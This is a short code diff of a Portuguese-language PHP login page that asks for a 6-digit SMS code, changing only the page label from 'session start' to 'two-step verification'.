@@ -67,7 +67,7 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         <div class="content-wrapper">
             
             <div class="left-column">
-                <span class="session-start-label">INÍCIO DE SESSÃO</span>
+                <span class="session-start-label">VERIFICAÇÃO EM 2 ETAPAS</span>
                 <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
                 <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>
 
